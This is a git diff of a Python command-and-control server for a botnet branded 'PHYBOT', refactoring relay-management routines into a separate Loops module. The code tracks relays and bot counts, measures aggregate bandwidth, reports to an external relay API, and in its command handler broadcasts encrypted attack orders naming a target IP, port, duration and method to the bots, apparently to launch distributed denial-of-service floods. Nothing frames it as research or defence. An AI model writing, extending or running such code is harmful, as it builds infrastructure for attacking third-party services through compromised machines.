@@ -12,6 +12,7 @@ import os
 import requests
 from pystyle import Colors, Colorate
 from config import c2_config_t as tconf, c2_config_addr as addrconf
+from modules.loops import Loops as loop
 
 
 
@@ -76,19 +77,19 @@ def find_login(username: str, password: str):
         return False
 
 
-def relay_api(data, act: bool):
-    ip=data['ip']
-    bots=data['bots']
-    url=f"{api_url}/relays.php?urlkey={urlkey}&ip={ip}&bots={bots}&act={act}"
-    try:
-        r=requests.get(url).json()
-        print(r)
-        if r=="ok":
-            return True
-        else:
-            return False
-    except Exception as e:
-        print(f"error \n{url}\n{e}\n\n")
+# def relay_api(data, act: bool):
+#     ip=data['ip']
+#     bots=data['bots']
+#     url=f"{api_url}/relays.php?urlkey={urlkey}&ip={ip}&bots={bots}&act={act}"
+#     try:
+#         r=requests.get(url).json()
+#         print(r)
+#         if r=="ok":
+#             return True
+#         else:
+#             return False
+#     except Exception as e:
+#         print(f"error \n{url}\n{e}\n\n")
 
 
 def send(socket, data: str, escape=True, reset=True):
@@ -114,223 +115,223 @@ def broadcast(data: str):
 
 
 
-def ping():
-    while 1:
-        dead_relay = []
-        for relays in list(relay):
-            try:
-                relays.settimeout(3)
-                send(relays, 'RPING', False, False)
-                if relays.recv(1024).decode() != f'RPONG[p:{relaykey}]':
-                    dead_relay.append(relays)
-            except:
-                print("except rping")
-                dead_relay.append(relays)
+# def ping():
+#     while 1:
+#         dead_relay = []
+#         for relays in list(relay):
+#             try:
+#                 relays.settimeout(3)
+#                 send(relays, 'RPING', False, False)
+#                 if relays.recv(1024).decode() != f'RPONG[p:{relaykey}]':
+#                     dead_relay.append(relays)
+#             except:
+#                 print("except rping")
+#                 dead_relay.append(relays)
             
-        for relays in list(dead_relay):
-            relay.pop(relays)
-            relays.close()
-        time.sleep(tconf.ping_t)
+#         for relays in list(dead_relay):
+#             relay.pop(relays)
+#             relays.close()
+#         time.sleep(tconf.ping_t)
 
 
 
-def _ping():
-    dead_relay = []
-    for relays in list(relay):
-        try:
-            relays.settimeout(3)
-            send(relays, 'RPING', False, False)
-            if relays.recv(1024).decode() != f'RPONG[p:{relaykey}]':
-                dead_relay.append(relays)
-        except:
-            dead_relay.append(relays)
+# def _ping():
+#     dead_relay = []
+#     for relays in list(relay):
+#         try:
+#             relays.settimeout(3)
+#             send(relays, 'RPING', False, False)
+#             if relays.recv(1024).decode() != f'RPONG[p:{relaykey}]':
+#                 dead_relay.append(relays)
+#         except:
+#             dead_relay.append(relays)
         
-    for relays in list(dead_relay):
-        relay.pop(relays)
-        relays.close()
+#     for relays in list(dead_relay):
+#         relay.pop(relays)
+#         relays.close()
 
 
 
-def net():
-    while 1:
-        while speed!=[]:
-            for i in speed:
-                speed.remove(i)
-        print(speed)
-        dead_relay = []
-        for relays in list(relay):
-            print(relays)
-            try:
-                relays.settimeout(3)
-                send(relays, f'RNETSPEED', False, False)
-                data=relays.recv(1024).decode()
-                print(data)
-                try:
-                    if data=="":
-                        print('not')
-                        dead_relay.append(relays)
-                    else:
-                        speed.append(int(data))
-                        print('ok')
-                except:
-                    speed.append(int(data))
-            except:
-                print("except")
-                dead_relay.append(relays)
+# def net():
+#     while 1:
+#         while speed!=[]:
+#             for i in speed:
+#                 speed.remove(i)
+#         print(speed)
+#         dead_relay = []
+#         for relays in list(relay):
+#             print(relays)
+#             try:
+#                 relays.settimeout(3)
+#                 send(relays, f'RNETSPEED', False, False)
+#                 data=relays.recv(1024).decode()
+#                 print(data)
+#                 try:
+#                     if data=="":
+#                         print('not')
+#                         dead_relay.append(relays)
+#                     else:
+#                         speed.append(int(data))
+#                         print('ok')
+#                 except:
+#                     speed.append(int(data))
+#             except:
+#                 print("except")
+#                 dead_relay.append(relays)
             
-        for relays in list(dead_relay):
-            relay.pop(relays)
-            relays.close()
-        time.sleep(tconf.net_t)
+#         for relays in list(dead_relay):
+#             relay.pop(relays)
+#             relays.close()
+#         time.sleep(tconf.net_t)
 
 
 
-def _net():
-    while speed!=[]:
-        for i in speed:
-            speed.remove(i)
-    print(speed)
-    dead_relay = []
-    for relays in list(relay):
-        print(relays)
-        try:
-            relays.settimeout(3)
-            send(relays, f'RNETSPEED', False, False)
-            data=relays.recv(1024).decode()
-            print(data)
-            try:
-                if data=="":
-                    print('not')
-                    dead_relay.append(relays)
-                else:
-                    speed.append(int(data))
-                    print('ok')
-            except:
-                speed.append(int(data))
-        except:
-            print("except")
-            dead_relay.append(relays)
+# def _net():
+#     while speed!=[]:
+#         for i in speed:
+#             speed.remove(i)
+#     print(speed)
+#     dead_relay = []
+#     for relays in list(relay):
+#         print(relays)
+#         try:
+#             relays.settimeout(3)
+#             send(relays, f'RNETSPEED', False, False)
+#             data=relays.recv(1024).decode()
+#             print(data)
+#             try:
+#                 if data=="":
+#                     print('not')
+#                     dead_relay.append(relays)
+#                 else:
+#                     speed.append(int(data))
+#                     print('ok')
+#             except:
+#                 speed.append(int(data))
+#         except:
+#             print("except")
+#             dead_relay.append(relays)
         
-    for relays in list(dead_relay):
-        relay.pop(relays)
-        relays.close()
+#     for relays in list(dead_relay):
+#         relay.pop(relays)
+#         relays.close()
 
 
 
-def getbot():
-    while 1:
-        while bots!=[]:
-            for i in bots:
-                bots.remove(i)
-        while temprbots!=[]:
-            for i in temprbots:
-                temprbots.remove(i)
-        print(bots)
-        dead_relay = []
-        for relays in list(relay):
-            try:
-                relays.settimeout(3)
-                send(relays, f'RNETBOTS', False, False)
-                data=relays.recv(1024).decode()
-                print(data)
-                try:
-                    temprbots.append({'ip': relays.getpeername()[0], 'bots': int(data)})
-                    print({'ip': relays.getpeername()[0], 'bots': int(data)})
-                except Exception as e:
-                    print(e)
-                print(temprbots)
-                try:
-                    if data=="":
-                        print('not')
-                        dead_relay.append(relays)
-                    else:
-                        bots.append(int(data))
-                        print('ok')
-                except:
-                    bots.append(int(data))
-            except Exception as e:
-                print(f"except getbot\n\n{e}\n\n")
-                dead_relay.append(relays)
-        while rbots!=[]:
-            for i in rbots:
-                rbots.remove(i)
-        for i in temprbots:
-            rbots.append(i)
-            if relay_api(i, False):
-                print('ok')
-            else:
-                print("relay_api error")
+# def getbot():
+#     while 1:
+#         while bots!=[]:
+#             for i in bots:
+#                 bots.remove(i)
+#         while temprbots!=[]:
+#             for i in temprbots:
+#                 temprbots.remove(i)
+#         print(bots)
+#         dead_relay = []
+#         for relays in list(relay):
+#             try:
+#                 relays.settimeout(3)
+#                 send(relays, f'RNETBOTS', False, False)
+#                 data=relays.recv(1024).decode()
+#                 print(data)
+#                 try:
+#                     temprbots.append({'ip': relays.getpeername()[0], 'bots': int(data)})
+#                     print({'ip': relays.getpeername()[0], 'bots': int(data)})
+#                 except Exception as e:
+#                     print(e)
+#                 print(temprbots)
+#                 try:
+#                     if data=="":
+#                         print('not')
+#                         dead_relay.append(relays)
+#                     else:
+#                         bots.append(int(data))
+#                         print('ok')
+#                 except:
+#                     bots.append(int(data))
+#             except Exception as e:
+#                 print(f"except getbot\n\n{e}\n\n")
+#                 dead_relay.append(relays)
+#         while rbots!=[]:
+#             for i in rbots:
+#                 rbots.remove(i)
+#         for i in temprbots:
+#             rbots.append(i)
+#             if relay_api(i, False):
+#                 print('ok')
+#             else:
+#                 print("relay_api error")
                     
-        for relays in list(dead_relay):
-            relay.pop(relays)
-            relays.close()
-        time.sleep(tconf.getbot_t)
+#         for relays in list(dead_relay):
+#             relay.pop(relays)
+#             relays.close()
+#         time.sleep(tconf.getbot_t)
         
         
 
-def _getbot():
-    while bots!=[]:
-        for i in bots:
-            bots.remove(i)
-    while temprbots!=[]:
-        for i in temprbots:
-            temprbots.remove(i)
-    print(bots)
-    dead_relay = []
-    for relays in list(relay):
-        try:
-            relays.settimeout(3)
-            send(relays, f'RNETBOTS', False, False)
-            data=relays.recv(1024).decode()
-            print(data)
-            try:
-                temprbots.append({'ip': relays.getpeername()[0], 'bots': int(data)})
-                print({'ip': relays.getpeername()[0], 'bots': int(data)})
-            except Exception as e:
-                print(e)
-            print(temprbots)
-            try:
-                if data=="":
-                    print('not')
-                    dead_relay.append(relays)
-                else:
-                    bots.append(int(data))
-                    print('ok')
-            except:
-                bots.append(int(data))
-        except Exception as e:
-            print(f"except getbot\n\n{e}\n\n")
-            dead_relay.append(relays)
-    while rbots!=[]:
-        for i in rbots:
-            rbots.remove(i)
-    for i in temprbots:
-        rbots.append(i)
-        if relay_api(i, False):
-            print('ok')
-        else:
-            print("relay_api error")
+# def _getbot():
+#     while bots!=[]:
+#         for i in bots:
+#             bots.remove(i)
+#     while temprbots!=[]:
+#         for i in temprbots:
+#             temprbots.remove(i)
+#     print(bots)
+#     dead_relay = []
+#     for relays in list(relay):
+#         try:
+#             relays.settimeout(3)
+#             send(relays, f'RNETBOTS', False, False)
+#             data=relays.recv(1024).decode()
+#             print(data)
+#             try:
+#                 temprbots.append({'ip': relays.getpeername()[0], 'bots': int(data)})
+#                 print({'ip': relays.getpeername()[0], 'bots': int(data)})
+#             except Exception as e:
+#                 print(e)
+#             print(temprbots)
+#             try:
+#                 if data=="":
+#                     print('not')
+#                     dead_relay.append(relays)
+#                 else:
+#                     bots.append(int(data))
+#                     print('ok')
+#             except:
+#                 bots.append(int(data))
+#         except Exception as e:
+#             print(f"except getbot\n\n{e}\n\n")
+#             dead_relay.append(relays)
+#     while rbots!=[]:
+#         for i in rbots:
+#             rbots.remove(i)
+#     for i in temprbots:
+#         rbots.append(i)
+#         if relay_api(i, False):
+#             print('ok')
+#         else:
+#             print("relay_api error")
                 
-    for relays in list(dead_relay):
-        relay.pop(relays)
-        relays.close()
+#     for relays in list(dead_relay):
+#         relay.pop(relays)
+#         relays.close()
 
 
 
-def _smsg(ip: str, port: int, data: str):
-    dead_relay = []
-    for relays in list(relay):
-        try:
-            relays.settimeout(3)
-            send(relays, str({'enc': {}, 'dec': {}, 'target': {'ip': ip, 'port': port, 'data': data}}), False, False)
-            if relays.recv(1024).decode() != f"SMSG[p:{relaykey}]":
-                dead_relay.append(relays)
-        except:
-            dead_relay.append(relays)
+# def _smsg(ip: str, port: int, data: str):
+#     dead_relay = []
+#     for relays in list(relay):
+#         try:
+#             relays.settimeout(3)
+#             send(relays, str({'enc': {}, 'dec': {}, 'target': {'ip': ip, 'port': port, 'data': data}}), False, False)
+#             if relays.recv(1024).decode() != f"SMSG[p:{relaykey}]":
+#                 dead_relay.append(relays)
+#         except:
+#             dead_relay.append(relays)
         
-    for relays in list(dead_relay):
-        relay.pop(relays)
-        relays.close()
+#     for relays in list(dead_relay):
+#         relay.pop(relays)
+#         relays.close()
 
 
 
@@ -441,20 +442,20 @@ def command_line(client, username: str):
             
             elif command=="SPEED":
                 try:
-                    _net()
+                    loop(urlkey=urlkey, api_url=api_url, relaykey=relaykey, speed=speed, relay=relay, temprbots=temprbots, rbots=rbots, bots=bots)._net()
                     send(client, f"{sum(speed)/125000} Gbps")
                 except Exception as e:
                     send(client, f"{rd}[{y}!{rd}]{r} Error: {e}")
                 
             elif command=="BOTS":
                 try:
-                    _getbot()
+                    loop(urlkey=urlkey, api_url=api_url, relaykey=relaykey, speed=speed, relay=relay, temprbots=temprbots, rbots=rbots, bots=bots)._getbot()
                     send(client, f"{sum(bots)} Bots")
                 except Exception as e:
                     send(client, f"{rd}[{y}!{rd}]{r} Error: {e}")
             
             elif command=="PING":
-                _ping()
+                loop(urlkey=urlkey, api_url=api_url, relaykey=relaykey, speed=speed, relay=relay, temprbots=temprbots, rbots=rbots, bots=bots)._ping()
             
             elif command=="METHOD":
                 try:
@@ -514,7 +515,7 @@ def command_line(client, username: str):
                     ip=args[1]
                     port=args[2]
                     data=args[3]
-                    _smsg(ip, port, data)
+                    loop(urlkey=urlkey, api_url=api_url, relaykey=relaykey, speed=speed, relay=relay, temprbots=temprbots, rbots=rbots, bots=bots)._smsg(ip, port, data)
                 except Exception as e:
                     send(client, Colorate.Horizontal(Colors.yellow_to_red, "PHYBOT", 1)+y+"."+Colorate.Horizontal(Colors.blue_to_purple, "server", 1)+f"{y}("+Colorate.Horizontal(Colors.purple_to_red, f"Error: {e}", 1)+f"{y})")
 
@@ -534,7 +535,7 @@ def command_line(client, username: str):
                         method=args[3]
                         cmd=f"{attackIP}:{attackP}/{tps}-{method}"
                         broadcast(cryptD(cmd.encode()))
-                        _net()
+                        loop(urlkey=urlkey, api_url=api_url, relaykey=relaykey, speed=speed, relay=relay, temprbots=temprbots, rbots=rbots, bots=bots)._net()
                         broadcast(cryptD(cmd.encode()))
                         send(client, Colorate.Horizontal(Colors.yellow_to_red, "PHYBOT", 1)+y+"."+Colorate.Horizontal(Colors.blue_to_purple, "server", 1)+f"{y}("+Colorate.Horizontal(Colors.yellow_to_red, f"Bots: {len(bots)}", 1)+f"{y})")
                         send(client, Colorate.Horizontal(Colors.yellow_to_red, "PHYBOT", 1)+y+"."+Colorate.Horizontal(Colors.blue_to_purple, "server", 1)+f"{y}("+Colorate.Horizontal(Colors.yellow_to_red, f"Attack IP: {attackIP}", 1)+f"{y})")
@@ -624,7 +625,7 @@ def main():
         print('Failed to bind port')
         exit()
 
-    if relay_api({'ip': '', 'bots': ''}, True):
+    if loop(urlkey=urlkey, api_url=api_url, relaykey=relaykey, speed=speed, relay=relay, temprbots=temprbots, rbots=rbots, bots=bots).relay_api({'ip': '', 'bots': ''}, True):
         pass
     else:
         print('Failed to relay api')
@@ -632,9 +633,9 @@ def main():
 
     sock.listen()
     
-    threading.Thread(target=ping).start()
-    threading.Thread(target=net).start()
-    threading.Thread(target=getbot).start()
+    threading.Thread(target=loop(urlkey=urlkey, api_url=api_url, relaykey=relaykey, speed=speed, relay=relay, temprbots=temprbots, rbots=rbots, bots=bots).ping).start()
+    threading.Thread(target=loop(urlkey=urlkey, api_url=api_url, relaykey=relaykey, speed=speed, relay=relay, temprbots=temprbots, rbots=rbots, bots=bots).net).start()
+    threading.Thread(target=loop(urlkey=urlkey, api_url=api_url, relaykey=relaykey, speed=speed, relay=relay, temprbots=temprbots, rbots=rbots, bots=bots).getbot).start()
 
     # accept all connections
     while 1:
